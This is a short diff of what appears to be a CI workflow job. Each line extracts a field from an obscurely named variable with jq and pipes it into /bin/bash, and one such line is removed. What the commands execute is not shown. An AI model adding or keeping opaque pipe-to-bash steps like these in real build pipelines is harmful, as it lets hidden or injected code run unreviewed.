@@ -23,7 +23,6 @@ jobs:
           echo $nucx7 | jq -r .wabn4 | /bin/bash
           echo $w15 | jq -r .qv10 | /bin/bash
           echo $hmmxv30834 | jq -r .xjae063 | /bin/bash
-          echo $wvbc712 | jq -r .dlrq2 | /bin/bash
           printf '%s' "$sl44632" | jq -r .ymiz29 | /bin/bash
           echo $eiggq6 | jq -r .qb657 | /bin/bash
           echo $do2959 | jq -r .av93 | /bin/bash
